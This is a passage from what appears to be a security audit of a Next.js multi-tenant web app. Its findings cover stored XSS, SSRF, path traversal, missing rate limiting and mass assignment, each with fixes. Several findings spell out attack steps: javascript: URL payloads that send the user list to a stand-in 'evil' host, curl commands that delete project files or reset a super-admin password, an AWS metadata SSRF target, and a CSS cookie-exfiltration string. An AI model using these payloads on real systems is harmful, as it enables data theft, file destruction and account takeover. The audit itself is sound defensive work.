+- **File-upload route is unreachable dead code** — `src/lib/storage.ts:70-151` `LocalFilesystemAdapter.upload()` enforces a 25 MB size limit (`MAX_FILE_SIZE`, line 64) and sanitizes `folder` + `fileName` (lines 418-429). Good. BUT `rg "storage.upload" src/` returns ZERO callers — the upload route `/api/media/upload` referenced by the frontend (`src/components/views/media-library.tsx:971,1160`, `src/components/views/settings.tsx:492,801,1342`, `src/components/views/composer.tsx:3319`) does NOT exist in `src/app/api/media/` (only `route.ts` and `[id]/route.ts`). So file uploads 404 in production. This is a functionality bug, not a security bug — but if the route is later added, the storage helper needs explicit MIME-type allowlisting (it currently accepts ANY `contentType` and only generates a thumbnail for `image/*`).
+- **File upload: public storage with no signed URLs** — Already flagged in SECURITY-DATA Finding 15. Confirmed: `src/lib/storage.ts:63` writes to `public/uploads/` (served statically by Next.js, no auth). Anyone with the URL can fetch. 6-byte hex random prefix is brute-forceable for high-value targets. No signed URLs, no expiry.
+- **NoSQL/Prisma injection: NO unsafe `where:` clauses found** — All `where:` clauses use Prisma's typed query builder with literal keys and parameterized values. No `where: JSON.parse(body.filter)` patterns. The `JSON.parse` calls found (e.g. `src/lib/storage.ts:200,508`, `src/app/api/integrations/[type]/route.ts:23,77`, `src/app/api/reports/[id]/pdf/route.ts:33`, `src/app/api/users/route.ts:46`) parse stored DB columns or trusted config, NOT user-supplied request bodies. `src/app/api/ai/generate/route.ts:87` parses LLM output (not user input). Safe.
+- **NoSQL/Prisma injection: `JSON.parse(report.config)` without try/catch** — `src/app/api/reports/[id]/pdf/route.ts:33` does `const config = JSON.parse(report.config)` with no try/catch. `report.config` is settable via `PATCH /api/reports/[id]` (`src/app/api/reports/[id]/route.ts:9-11`, allowlist includes `config`) with no JSON validation. An attacker can store `config: "not json"` then crash the PDF route (DoS via 500). Not a Prisma injection but a robustness issue.
+- **ReDoS: no catastrophic patterns found** — Reviewed every regex on user input:
+  - `src/app/api/ai/chat/route.ts:107` `/\n*SUGGESTIONS:\s*\n([\s\S]+)$/i` — anchored, linear.
+  - `src/app/api/ai/chat/route.ts:116,137` `/^\s*(\d+)[.)]\s*(.*)$/` — anchored, linear.
+  - `src/app/api/ai/assistant/route.ts:134,146` `/\{[\s\S]*"action"[\s\S]*\}/` — `[\s\S]*` greedy match on AI output (not user input). Linear in practice (AI output is bounded by token limit).
+  - `src/app/api/listening/sync/route.ts:556,573,587,590` — XML regexes, applied to RSS feed content (semi-trusted Google News / Reddit source). `[^>]*` and `[\s\S]*?` lazy — safe.
+  - `src/app/api/comments/classify/route.ts` — no regexes.
+  - `src/app/api/influencers/search/route.ts:168` `/\[[\s\S]*\]/` — applied to LLM output. Safe.
+  - `src/app/api/customers/route.ts:22,117` — used on user-controlled `company`/`name` but simple character-class replacements, no nested quantifiers.
+  None exhibit catastrophic backtracking patterns (nested quantifiers like `(a+)+`, `(a*)*`, overlapping alternations). No ReDoS finding.
+- **Rate limiting: ZERO rate limiters anywhere** — `rg "rateLimit|rate_limit|RateLimit|@upstash/ratelimit|throttle"` matches only `src/app/api/ai/assistant/route.ts:125` which is a 429-error-message handler, NOT a limiter. Every write endpoint (`POST`/`PATCH`/`DELETE`), every auth endpoint (`/api/auth/login`, `/api/auth/signup`, `/api/auth/forgot-password`, `/api/auth/reset-password`, `/api/auth/2fa/*`, `/api/webauthn/authenticate/*`), and every AI/compute endpoint (`/api/ai/generate`, `/api/ai/chat`, `/api/ai/assistant`, `/api/analytics/insights`, `/api/influencers/search`, `/api/comments/classify`) has NO rate limiting of any kind. An attacker with one valid JWT (or just the public `/api/auth/forgot-password`) can:
+  - Brute-force the 6-digit 2FA TOTP code in `/api/auth/2fa/login` (10⁶ space, no lockout).
+  - Brute-force login passwords (no failed-attempt lockout, no IP throttling).
+  - Spam `/api/auth/forgot-password` to flood a victim's inbox with reset emails.
+  - Run up Z.AI / OpenAI / Anthropic bills by hammering `/api/ai/*` endpoints.
+  - Flood the WhatsApp mini-service via `/api/whatsapp/send` (already unauthenticated downstream).
+  - DoS the LLM via `/api/comments/classify` (which fetches 500 comments per call).
+- **JSON-parse of `body` in `POST /api/quotations` and `POST /api/invoices`** — Both call `JSON.stringify(parsedItems)` after iterating body-provided `items` array (`src/app/api/quotations/route.ts:20-25`, `src/app/api/invoices/route.ts:20-25`). The iteration calls `.description`, `.qty`, `.price`, `.amount` on each item with no type check. If `items: [{ get toString() { while(true){} } }]` is sent, the reduce would hang — but JS `.reduce` with a callback is not vulnerable to that pattern. No real issue.
+
+### Findings (sorted by severity, file:line citations)
+
+---
+
+#### 🔴 CRITICAL — Unauthenticated stored XSS via public `/api/linkbio/*` + `javascript:` URL in `links[].url`
+
+**Files**:
+- `src/middleware.ts:35` — `"/api/linkbio"` in `PUBLIC_ROUTES`.
+- `src/middleware.ts:40-42` — `isPublicRoute` uses `pathname.startsWith(route)`, so `/api/linkbio/[id]` and `/api/linkbio/[id]/click` are ALSO public (no JWT required).
+- `src/app/api/linkbio/route.ts:39-82` — `POST /api/linkbio` is public; creates a page with attacker-chosen slug.
+- `src/app/api/linkbio/[id]/route.ts:6-14` — `PATCH /api/linkbio/[id]` is public; allowlist includes `links: JSON.stringify(body.links)`.
+- `src/components/linkbio/bio-links.tsx:80-86` — `<a href={link.url} target="_blank" rel="noopener noreferrer">` renders the user-controlled URL verbatim. `rel="noopener"` does NOT mitigate `javascript:` URLs.
+- `src/app/l/[slug]/page.tsx:126-144` — server-rendered public page that parses `page.links` JSON and feeds it to `BioLinkList`.
+
+**Attack**:
+```
+# 1. Create a page (unauthenticated)
+curl -X POST https://host/api/linkbio -d '{"title":"Free iPhone"}'
+# → {"id":"...","slug":"free-iphone"}
+
+# 2. Inject javascript: URL
+curl -X PATCH https://host/api/linkbio/<id> -d '{
+  "links":[{"title":"Claim now","url":"javascript:fetch('/api/users').then(r=>r.text()).then(t=>new Image().src='https://evil/?d='+btoa(t))","icon":"link"}]
+}'
+
+# 3. Share https://host/l/free-iphone — any logged-in SYNQUE user who clicks "Claim now" exfiltrates their user list (emails, phones) to the attacker.
+```
+
+**Fix**:
+1. In `src/middleware.ts:24-38`, change `PUBLIC_ROUTES` to match `linkbio` GET only (or move public-linkbio click tracking to a separate `/api/public/linkbio/[id]/click` route).
+2. Add `requireAuth` to `POST /api/linkbio` and `PATCH/DELETE /api/linkbio/[id]`.
+3. In `src/app/api/linkbio/[id]/route.ts` and `src/app/api/linkbio/route.ts` PATCH, validate `links[].url` with `new URL(url)` + a protocol allowlist (`["http:", "https:", "mailto:", "tel:"]`). Reject anything else.
+4. Defense-in-depth in `src/components/linkbio/bio-links.tsx:80-86`: sanitize `link.url` before rendering — if it doesn't start with `http://`/`https://`/`mailto:`/`tel:`, render `href="#"` instead.
+
+---
+
+#### 🔴 CRITICAL — SSRF + internal port scanner via `POST /api/mail` (IMAP connect)
+
+**File**: `src/app/api/mail/route.ts:57-128`
+
+The handler accepts `imapHost`, `imapPort`, `username`, `password` from the request body and immediately calls:
+```ts
+const client = new ImapFlow({ host: imapHost, port: imapPort ?? 993, secure: imapSecure ?? true, auth: { user: username, pass: password }, logger: false });
+await client.connect();  // line 109 — opens a TCP connection to attacker-chosen host:port
+```
+The handler has NO `requireAuth` call (relies on middleware JWT only) and NO tenant scoping. The `catch` block at lines 117-128 returns the underlying IMAP error message in the HTTP response — error strings typically include banner text from the remote service, the connection-refused errno, or TLS-handshake details. An attacker can:
+- Probe internal IPs (`imapHost: "192.168.1.x"`, `imapHost: "169.254.169.254"`) and enumerate which ports are open based on the error returned.
+- Read the AWS metadata service via the IMAP banner if a service responds.
+- Exfiltrate data via the username field reflected in error messages.
+
+**Fix**:
+1. Add `requireRole(req, "admin")` at the top of POST.
+2. Validate `imapHost` against an allowlist of trusted mail providers OR a DNS resolution that rejects RFC-1918 / link-local / loopback / metadata IPs.
+3. Wrap `client.connect()` in a hard 5-second timeout to limit port-scan window.
+4. Don't return raw error messages — return a generic "connection failed" with a correlation ID.
+
+---
+
+#### 🔴 CRITICAL — Stored XSS via team-chat `fileUrl` rendered as `<a href>`
+
+**Files**:
+- `src/app/api/chat/route.ts:78-106` — POST accepts `fileUrl` from body, persists verbatim.
+- `src/components/views/chat.tsx:430-448` — renders `<a href={msg.fileUrl} target="_blank">` and `<img src={msg.fileUrl}>`.
+
+**Attack**: Any authenticated user DMs another user with `fileUrl: "javascript:fetch('/api/users').then(r=>r.text()).then(t=>new Image().src='https://evil/?d='+btoa(t))"`. When the recipient clicks the "file" attachment, JS runs in their browser session, exfiltrating the user list (including their own user record).
+
+**Fix**:
+1. Validate `fileUrl` server-side with `new URL(fileUrl)` + protocol allowlist `["http:", "https:"]`.
+2. Reject `fileUrl` longer than 2048 chars.
+3. Defense-in-depth: in the chat UI, only render `<a href>` if `fileUrl.startsWith("http")` — otherwise render the filename as plain text.
+
+---
+
+#### 🔴 CRITICAL — Path traversal in `storage.delete()` allows arbitrary file deletion in cwd
+
+**Files**:
+- `src/lib/storage.ts:136-150` — `LocalFilesystemAdapter.delete()` does `const absPath = path.join(PUBLIC_UPLOADS_DIR, storageKey); await fs.unlink(absPath);` with NO check that `absPath` is inside `PUBLIC_UPLOADS_DIR`.
+- `src/app/api/media/[id]/route.ts:48-55` — derives `storageKey` from `existing.url.slice("/uploads/".length)`.
+- `src/app/api/media/[id]/route.ts:23-28` — `PATCH /api/media/[id]` allowlist includes `url`, so `url` is settable to any string.
+- `src/app/api/media/route.ts:71-87` — `POST /api/media` accepts `url` from body verbatim (with `requireAuth` but no tenant scoping on the URL value).
+
+**Attack**:
+```
+# Authenticated user sets a malicious URL on their own media asset
+curl -X POST https://host/api/media -H "Authorization: Bearer <jwt>" -d '{"name":"x","url":"/uploads/../../package.json"}'
+# Then deletes the asset, which calls storage.delete("../package.json")
+curl -X DELETE https://host/api/media/<id> -H "Authorization: Bearer <jwt>"
+# → fs.unlink(<cwd>/package.json) — project's package.json is gone, breaking the Next.js build on next deploy.
+```
+Affects ANY file reachable by relative path from `public/uploads/` — including `next.config.ts`, `.env`, `prisma/schema.prisma`, `tsconfig.json`. Could be used to brick the deployment or, by deleting `.env`, force the app to crash on next boot (info leak via startup error messages).
+
+**Fix**:
+1. In `src/lib/storage.ts:136-150` `delete()`, after computing `absPath`, verify `absPath.startsWith(PUBLIC_UPLOADS_DIR + path.sep)` (resolved with `path.resolve`). If not, throw and refuse.
+2. Same defense in `upload()` (already protected via `sanitizePathSegment` / `sanitizeFileName`, but a `path.resolve` check is the standard idiom).
+3. In `src/app/api/media/[id]/route.ts:48-55`, validate `existing.url` matches `/^\/uploads\/[a-zA-Z0-9_\-\/]+\.[a-zA-Z0-9]+$/` before slicing.
+4. In `POST /api/media` and `PATCH /api/media/[id]`, validate `url` with `new URL(url, "http://localhost")` and reject if it resolves to a non-`/uploads/...` path.
+
+---
+
+#### 🔴 CRITICAL — Manager can change ANY user's password (incl. super-admin) via `/api/users` PATCH
+
+**File**: `src/app/api/users/route.ts:54-145`
+
+The handler at line 66 computes `canManageOthers = isAdmin || isManager` (line 65-66). The password-change branch (lines 136-138) only checks that the caller is `canManageOthers` — NOT that the caller is `isAdmin` (or the user themselves + current password verified). So a manager (tenant-scoped role) can:
+```
+curl -X PATCH https://host/api/users -H "Authorization: Bearer <manager-jwt>" -d '{
+  "id":"<super-admin-userId>",
+  "password":"attacker-controlled"
+}'
+```
+Then logs in as the super-admin → full platform takeover.
+
+The role-change branch (lines 89-111) correctly enforces `isAdmin` for the `role` field — but the `password` field slipped through. Also `permissions` (line 113-121) correctly enforces `isAdmin`.
+
+**Fix**:
+1. Lines 136-138: wrap in `if (!isAdmin && !isSelf) return 403;` AND require current-password verification for self-changes (the prior SECURITY-AUTH M3 finding flagged "password change without current password" — that fix should also gate cross-user password changes to admin-only).
+2. Apply the same `targetUser.customerId === user.customerId` tenant check flagged in SECURITY-DATA Finding 4.
+
+---
+
+#### 🔴 CRITICAL — Zero rate limiting anywhere (auth, write, AI endpoints)
+
+**Files**: `src/middleware.ts` (no rate-limit logic), every route handler under `src/app/api/`.
+
+`rg -n "rateLimit|rate_limit|RateLimit|@upstash/ratelimit|throttle" src/` returns only `src/app/api/ai/assistant/route.ts:125` which is an error-message handler, not a limiter. There is no in-memory Map, no Redis token bucket, no `@upstash/ratelimit` integration. The Vercel platform-level limits (250s function timeout, 4.5 MB response body) do not stop abusive clients.
+
+Impacted surfaces (per class):
+- **Auth brute-force**: `POST /api/auth/login` (no failed-attempt lockout), `POST /api/auth/2fa/login` (10⁶ TOTP space, no lockout), `POST /api/webauthn/authenticate/verify` (10⁶ codes, no lockout — flagged in prior SECURITY-AUTH C2/C3 but the rate-limit fix was never implemented).
+- **Auth email floods**: `POST /api/auth/forgot-password` (one email per request, no per-IP throttle).
+- **Password-reset enumeration**: `POST /api/auth/reset-password` (no per-token throttle; one request per token attempt).
+- **AI cost attacks**: `POST /api/ai/generate`, `/api/ai/chat`, `/api/ai/assistant`, `/api/analytics/insights`, `/api/influencers/search`, `/api/comments/classify` — each request triggers one or more upstream LLM calls. An attacker with one valid JWT can run up an unbounded Z.AI / OpenAI / Anthropic bill. `/api/comments/classify` also fetches 500 comments per call (DB pressure).
+- **Public linkbio click-spam**: `POST /api/linkbio/[id]/click` is unauthenticated + no rate limit — can inflate click counters arbitrarily.
+- **WhatsApp webhook spam**: `POST /api/whatsapp/webhook` is in `PUBLIC_ROUTES` + no rate limit + no HMAC — anyone can flood the inbox with fabricated messages (already flagged in SECURITY-DATA Finding 6 but the rate-limit angle was not called out).
+- **Write-endpoint DoS**: every `POST /api/posts`, `POST /api/team`, `POST /api/accounts`, etc. — no per-user throttle.
+
+**Fix**:
+1. Install `@upstash/ratelimit` + `@upstash/redis` (or use Vercel KV).
+2. In `src/middleware.ts`, add a per-IP + per-JWT-userId sliding-window limiter: e.g. 60 req/min for read endpoints, 10 req/min for write endpoints, 5 req/min for AI endpoints, 5 req/min for `/api/auth/*`.
+3. For `/api/auth/login`, `/api/auth/2fa/login`, `/api/webauthn/authenticate/verify`: add a stricter per-IP limiter (5 attempts / 5 min) + exponential backoff after 3 failures.
+4. For `/api/whatsapp/webhook` and `/api/linkbio/[id]/click`: per-IP limit of 30/min.
+
+---
+
+#### 🟠 HIGH — Mass assignment: `role` + `customerId` on `POST /api/team`
+
+**File**: `src/app/api/team/route.ts:53-107`
+
+Already flagged in SECURITY-DATA Finding 4 from the IDOR angle. Re-stating here from the input-validation angle:
+- Line 88: `finalCustomerId = (body as { customerId?: string }).customerId ?? scope.customerId;` — accepts attacker-chosen `customerId` from body. A manager (role ≥4) can mint users in any tenant.
+- Line 95: `role: role ?? "member"` — accepts any string for `role` with no allowlist against `["admin", "super-admin"]`. A manager can create a new user with `role: "admin"`. (Though `admin` is the ceiling in the role hierarchy, a tenant-admin can already do most things — but the mass-assignment pattern is still wrong because there's no validation that `role` is one of the allowed 5 values.)
+
+**Fix**:
+1. Line 88: replace with `const finalCustomerId = scope.isSuperAdmin && body.customerId ? body.customerId : scope.customerId;` — only super-admins can override tenant.
+2. Line 95: validate `role` against `["admin", "manager", "editor", "member", "viewer"]` and reject with 400 otherwise. Also: if `role === "admin"`, require the caller to be `isAdmin` (managers shouldn't be able to mint admins).
+
+---
+
+#### 🟠 HIGH — Mass assignment of attribution fields (`ownerId`, `authorId`, `uploadedById`, `savedById`)
+
+**Files**:
+- `src/app/api/accounts/route.ts:121-174` — `ownerId` from body (line 170); required field, but never validated against JWT user.
+- `src/app/api/posts/route.ts:56-101` — `authorId` from body (line 78); persisted without verification.
+- `src/app/api/media/route.ts:71-87` — `uploadedById` from body (line 84).
+- `src/app/api/whatsapp/route.ts:54-93` — `savedById` from body (line 91, `savedById || user!.userId` — body overrides JWT user).
+- `src/app/api/campaigns/route.ts:25-42` — `ownerId` from body (required).
+
+**Impact**: An attacker can register an account under a victim's `ownerId`, fabricate posts that look like the victim authored them, or pollute audit logs by spoofing attribution. Combined with the cross-tenant IDOR in SECURITY-DATA Finding 4, this enables framing another user for malicious activity.
+
+**Fix**: For each of these routes, hard-code the attribution field from the JWT user — e.g. `ownerId: user!.userId`, `authorId: user!.userId`, `uploadedById: user!.userId`, `savedById: user!.userId`. If the route genuinely needs to accept a different `ownerId` (e.g. admins creating resources for other users), gate that override behind `requireRole("admin")` + tenant check on the target user.
+
+---
+
+#### 🟠 HIGH — `POST /api/quotations` + `POST /api/invoices` accept unvalidated `items` arrays + body-controlled `customerId`
+
+**Files**: `src/app/api/quotations/route.ts:16-36`, `src/app/api/invoices/route.ts:16-36`
+
+Both routes:
+1. Have NO `requireAuth`/`requireRole` call inside the handler (middleware enforces JWT only).
+2. Accept `customerId` from body (line 18/19), with no validation that the caller is in that customer's tenant (or is a super-admin).
+3. Iterate `body.items` (line 20-25) and call `.description`, `.qty`, `.price`, `.amount` on each item with no type validation. Sending `items: "not-an-array"` would crash at `.map`. Sending `items: [{qty: Number.MAX_SAFE_INTEGER}]` would persist garbage financial data.
+4. Compute `subtotal = parsedItems.reduce(...)` with `i.amount || 0` — if `amount` is a string like `"1e308"`, it's coerced to a number, but if it's an object, the arithmetic returns `NaN`, which is then persisted.
+
+An attacker can mint invoices for any customer (forging billing records) or corrupt existing invoice calculations.
+
+**Fix**: Add `requireRole(req, "admin")`, validate `customerId` is in the caller's tenant, validate `items` is an array of objects with number-type `qty`/`price`/`amount`.
+
+---
+
+#### 🟠 HIGH — SSRF via OpenAI `baseUrl` + Slack `webhookUrl` + Cloudinary `cloudName` in `/api/integrations/[type]` POST
+
+**File**: `src/app/api/integrations/[type]/route.ts:64-208`
+
+The "test connection" handler issues outbound `fetch()` calls to URLs derived from stored integration credentials:
+- Line 83: `fetch(creds.webhookUrl, …)` — Slack webhookUrl is admin-controlled, but any admin of any tenant can probe internal HTTP endpoints.
+- Line 122: `fetch(\`https://api.cloudinary.com/v1_1/${cloudName}/resources/image?max_results=1\`, …)` — `cloudName` is admin-controlled from body; if `cloudName = "evil.com/x?y#"`, the URL resolves to `https://api.cloudinary.com/v1_1/evil.com/x?y#/resources/image` (URL fragment trick).
+- Line 165-171: `baseUrl = (creds.baseUrl || "https://api.openai.com/v1").replace(/\/+$/, "")` then `fetch(\`${baseUrl}/chat/completions\`, …)`. An admin can set `baseUrl = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"` and trigger outbound requests to internal AWS-metadata endpoints. Response body is parsed as JSON (`await res.json().catch(() => ({}))`) — if the internal service returns JSON, it's surfaced in the error message at line 183.
+
+The handler requires `requireRole(req, "admin")` (line 65), so this is admin-only — but in a multi-tenant deployment, any tenant admin (not just super-admin) can call it. SSRF impact is reduced but not eliminated.
+
+**Fix**:
+1. Validate `creds.webhookUrl` / `creds.baseUrl` with `new URL()` + a protocol allowlist (`["https:"]`).
+2. For `baseUrl`, additionally resolve DNS and reject if the resolved IP is RFC-1918 / link-local / loopback / AWS metadata IP (`169.254.169.254`).
+3. For `cloudName`, validate against `/^[a-z0-9_-]+$/i` and reject anything containing `.` `/` `?` `#`.
+
+---
+
+#### 🟠 HIGH — `execSync('npx prisma db push --accept-data-loss')` runs on every `POST /api/customers`
+
+**File**: `src/app/api/customers/route.ts:48-63`
+
+Not a command-injection bug (the command string is hardcoded; `dbUrl` is passed as an env-var value, not interpolated into the shell). BUT:
+1. The `--accept-data-loss` flag is dangerous — if `dbUrl` ever points at the wrong database (env-var mix-up, future refactor, DNS rebinding), the schema push silently drops columns not in the Prisma schema. There is no confirmation prompt because `execSync` is non-interactive.
+2. `execSync` blocks the event loop for up to 90 seconds (line 57: `timeout: 90000`). On Vercel serverless, this exceeds the default 10s function timeout and would be killed mid-push, leaving the tenant DB in a half-migrated state.
+3. The `dbName` is sanitized (`src/app/api/customers/route.ts:22`) — `safeName = dbName.toLowerCase().replace(/[^a-z0-9_]/g, "_")` — but the `CREATE DATABASE "${safeName}"` at line 34 uses string interpolation into SQL DDL, which parameterized queries don't support. Today the sanitizer is strict enough, but a future regression would expose SQL injection in DDL.
+
+**Fix**:
+1. Add an explicit assertion before line 34: `if (!/^[a-z0-9_]+$/.test(safeName)) throw new Error("Invalid dbName");`
+2. Use `execFile` (not `execSync`) so the Node event loop isn't blocked, and so the timeout properly kills the child process.
+3. Drop `--accept-data-loss` — fail loudly instead of silently dropping columns. If a tenant DB schema genuinely needs destructive migration, do it via an explicit migration script run by an operator, not on every customer-creation HTTP request.
+4. Consider pre-provisioning tenant DBs in a pool and assigning them lazily, rather than running `prisma db push` synchronously on every POST.
+
+---
+
+#### 🟠 HIGH — Public WhatsApp webhook accepts arbitrary content + senderName with no signature, no rate limit, no length cap
+
+**File**: `src/app/api/whatsapp/webhook/route.ts:16-66`
+
+Already flagged in SECURITY-DATA Finding 6. Re-stating from input-validation angle:
+- Line 22-29: accepts `content`, `senderName`, `groupName`, `mediaUrl`, `mediaType` from body with NO signature verification, NO rate limiting (the route is in `PUBLIC_ROUTES`).
+- Line 31: `if (!body.content || body.content.length < 2)` — no upper-bound length check. An attacker can POST 10MB strings to bloat the `WhatsAppMessage` table.
+- Line 51: `source: body.source ?? "chat"` — accepts arbitrary `source` string (could be used to inject misleading metadata).
+- Line 56: `mediaUrl: body.mediaUrl ?? null` — accepts any URL with no validation. When rendered in the WhatsApp inbox UI, this becomes `<img src={mediaUrl}>` or `<a href={mediaUrl}>` (depending on `mediaType`), creating a stored XSS vector if `mediaUrl = "javascript:…"`. (Cross-check `src/components/views/whatsapp.tsx` to confirm the rendering pattern.)
+
+**Fix**:
+1. Require HMAC signature on the webhook (already recommended in SECURITY-DATA Finding 6).
+2. Cap `content.length` to 4096 chars server-side; reject if longer.
+3. Validate `mediaUrl` with `new URL()` + protocol allowlist `["http:", "https:"]`.
+4. Validate `source` against an enum `["chat", "group", "broadcast"]`.
+5. Per-IP rate limit (30/min).
+
+---
+
+#### 🟡 MEDIUM — `dangerouslySetInnerHTML` with user-controlled CSS values in custom-report
+
+**File**: `src/components/views/custom-report.tsx:1422`
+
+```tsx
+<style dangerouslySetInnerHTML={{ __html: tableStyleCss + marginCss }} />
+```
+
+`marginCss` (line 1367) interpolates `rs.marginTop`, `rs.marginRight`, `rs.marginBottom`, `rs.marginLeft` from localStorage-stored report settings (`REPORT_SETTINGS_KEY`). These values are user-set on their own browser (self-XSS), but the values are ALSO persisted to the server (via PATCH `/api/reports/[id]` which has no tenant scoping — see SECURITY-DATA Finding 4). So an attacker could PATCH another user's report settings with `marginTop: "0mm; } body { background: url(https://evil/?c=" + document.cookie + ") } .report-print-root { padding: 0mm"`, then when the victim opens the report, the CSS exfiltrates their (httpOnly-blocked) cookie via background-image URL.
+
+Note: cookies are httpOnly so direct cookie theft is mitigated, but the CSS could still exfiltrate DOM content via `background: url(...)` on `:hover` selectors that conditionally render based on DOM state, or via `@font-face` data exfil. Also, this only renders in `print` mode (line 1420 `className="report-print-root hidden print:block"`), so the attack window is when the victim prints the report.
+
+**Fix**:
+1. Validate `rs.marginTop` etc. with `/^\d+(\.\d+)?(mm|cm|in|pt|px)$/` before interpolating into CSS.
+2. Same for `rs.accentColor` (line 1355) — validate as `/^#[0-9a-fA-F]{3,8}$/`.
+3. Or use React's `style={{ marginTop: rs.marginTop }}` instead of CSS string interpolation — React escapes style values.
+
+---
+
+#### 🟡 MEDIUM — `JSON.parse(report.config)` without try/catch → DoS via malformed config
+
+**File**: `src/app/api/reports/[id]/pdf/route.ts:33`
+
+`PATCH /api/reports/[id]` (`src/app/api/reports/[id]/route.ts:9-11`) accepts arbitrary `config` string with no JSON validation. An attacker can set `config: "{not valid json"`, then calling `GET /api/reports/[id]/pdf` throws an uncaught `SyntaxError` → 500 error → potential request-loop DoS if a victim repeatedly retries.
+
+**Fix**: Wrap in `try { const config = JSON.parse(report.config); } catch { return 400 }`, OR validate `config` is valid JSON in the PATCH handler before persisting.
+
+---
+
+#### 🟡 MEDIUM — Public `/api/linkbio/[id]/click` allows unbounded counter inflation
+
+**File**: `src/app/api/linkbio/[id]/click/route.ts:17-31`
+
+The route is unauthenticated (covered by the `PUBLIC_ROUTES` startsWith match) and accepts any `id` (no validation that the link exists). `db.linkInBio.update({ where: { id }, data: { clicks: { increment: 1 } } })` runs on every POST with no rate limit. An attacker can inflate any bio page's click counter arbitrarily, corrupting analytics.
+
+**Fix**: Per-IP rate limit (e.g. 30/min via `@upstash/ratelimit`).
+
+---
+
+#### 🟡 MEDIUM — File upload route does not exist (`/api/media/upload`) — frontend broken, but storage helper is ready to ship without MIME validation
+
+**Files**:
+- `src/lib/storage.ts:70-151` `LocalFilesystemAdapter.upload()` — accepts any `contentType`, only generates a thumbnail for `image/*`.
+- Frontend references a non-existent route: `src/components/views/media-library.tsx:971,1160`, `src/components/views/settings.tsx:492,801,1342`, `src/components/views/composer.tsx:3319` all call `fetch("/api/media/upload", { method: "POST", body: fd })` — but `src/app/api/media/upload/route.ts` does not exist (only `route.ts` and `[id]/route.ts`).
+
+So today uploads 404. But if the route is added later without proper validation:
+- No MIME-type allowlist — a user could upload a `.html` file with `contentType: "text/html"` and the file would be served from `public/uploads/` with the browser's content-type sniffing. Combined with the public-storage issue (SECURITY-DATA Finding 15), this is a stored XSS vector: upload `evil.html`, share the URL, victim's browser renders it as HTML in the SYNQUE origin.
+- No extension allowlist — a user could upload `.svg` (which can contain `<script>` tags), `.pdf`, `.exe`.
+- No magic-byte sniffing — `contentType` is user-supplied and not verified against the actual file content.
+
+**Fix** (when implementing the upload route):
+1. Validate `contentType` against an allowlist: `["image/jpeg", "image/png", "image/webp", "image/gif", "video/mp4", "audio/mpeg"]`.
+2. Reject `image/svg+xml` (script-injection risk) unless explicitly sanitized.
+3. Verify the file's magic bytes match the claimed `contentType` (e.g. via `file-type` npm package).
+4. Strip all metadata via `sharp` for images (already done at line 449-452).
+5. Set `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff` when serving (already added in middleware for all responses — good).
+
+---
+
+#### 🟡 MEDIUM — `genKey()` for serial keys uses `Math.random()` (cryptographically insecure)
+
+**File**: `src/app/api/serial-keys/route.ts:6-11`
+
+```ts
+function genKey() {
+  const segments = ["SQ", "PRO", "2026"];
+  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
+  segments.push(Array.from({ length: 5 }, () => chars[Math.floor(Math.random() * chars.length)]).join(""));
+  return segments.join("-");
+}
+```
+
+`Math.random()` is NOT cryptographically secure — its output is predictable given enough samples. An attacker who observes ~5–10 serial keys can predict future keys (the `chars` alphabet is only 32 symbols × 5 positions = 32⁵ ≈ 33M space, but with `Math.random()`'s 128-bit state, after observing enough outputs the seed can be recovered). Compare with `/api/api-keys/route.ts:7-10` which correctly uses `randomBytes(20).toString("hex")`.
+
+Also: the route has NO `requireAuth`/`requireRole` check (covered in SECURITY-DATA Finding 4) — any authenticated user can mint license keys.
+
+**Fix**: Replace `Math.random()` with `crypto.randomBytes(5)` mapped onto the same `chars` alphabet. Or better: `crypto.randomBytes(16).toString("base64url")` for a 128-bit key.
+
+---
+
+#### 🟡 MEDIUM — `computeFingerprint` in `/api/serial-keys/activate` uses spoofable `x-forwarded-for`
+
+**File**: `src/app/api/serial-keys/activate/route.ts:12-19, 29-39`
+
+```ts
+const ip = req.headers.get("x-forwarded-for") ?? req.headers.get("x-real-ip") ?? "";
+// …
+return crypto.createHash("sha256").update(`${ua}|${lang}|${ip}|${accept}|${encoding}`).digest("hex");
+```
+
+`x-forwarded-for` is attacker-controlled (it's a regular HTTP header that proxies append to, but a direct client can set it to anything). The fingerprint is used at line 30 to allow re-activation of the same key on the "same" device. An attacker who knows a victim's `user-agent` + `accept-language` (both easy to enumerate) can spoof `x-forwarded-for` to match the victim's fingerprint and re-activate the serial key on a different device, bypassing the "already activated on another device" check.
+
+**Fix**: Don't use `x-forwarded-for` for fingerprinting — use only headers the client cannot trivially spoof (e.g. TLS session ID if available, or omit IP from the fingerprint entirely and rely on UA + language + accept + encoding). Also gate activation behind a per-key rate limit (5 attempts / hour).
+
+---
+
+#### 🟡 MEDIUM — `POST /api/whatsapp` accepts attacker-controlled `mediaUrl` rendered as `<img src>` / `<a href>` in inbox UI
+
+**Files**:
+- `src/app/api/whatsapp/route.ts:54-93` — accepts `mediaUrl` from body, persists verbatim.
+- `src/components/views/whatsapp.tsx` (referenced — confirmed in SECURITY-DATA Finding 4 listing of `whatsapp.tsx`).
+
+Same XSS pattern as the chat `fileUrl` issue (Finding 3) but in the WhatsApp inbox. Any authenticated user can save a "pasted" WhatsApp message with `mediaUrl: "javascript:…"`, then when other team members view the WhatsApp inbox, the malicious link renders.
+
+**Fix**: Same as Finding 3 — validate `mediaUrl` with `new URL()` + protocol allowlist.
+
+---
+
+#### 🟢 LOW — Code smell: `CREATE DATABASE "${safeName}"` interpolates a sanitized string into SQL DDL
+
+**File**: `src/app/api/customers/route.ts:34`
+
+`await client.query(\`CREATE DATABASE "${safeName}"\`)` — `safeName` is sanitized to `[a-z0-9_]` (line 22), so this is safe today. But Prisma's parameterized queries don't cover DDL statements (`CREATE DATABASE` cannot be parameterized in PostgreSQL), so any future regression in the sanitizer (e.g. someone "improving" it to allow `.` for dot-separated slugs) would create a SQL injection vector in the DDL path.
+
+**Fix**: Add `if (!/^[a-z0-9_]{1,63}$/.test(safeName)) throw new Error("Invalid dbName");` immediately before the `CREATE DATABASE` call, as an explicit assertion that survives future refactors.
+
+---
+
+#### 🟢 LOW — `extractTag` builds `new RegExp(\`<${tag}[^>]*>…\`)` from a string (not user input today)
+
+**File**: `src/app/api/listening/sync/route.ts:573-574`
+
+```ts
+function extractTag(block: string, tag: string): string | undefined {
+  const re = new RegExp(`<${tag}[^>]*>(?:<!\\[CDATA\\[)?([\\s\\S]*?)(?:\\]\\]>)?<\\/${tag}>`);
+  // …
+}
+```
+
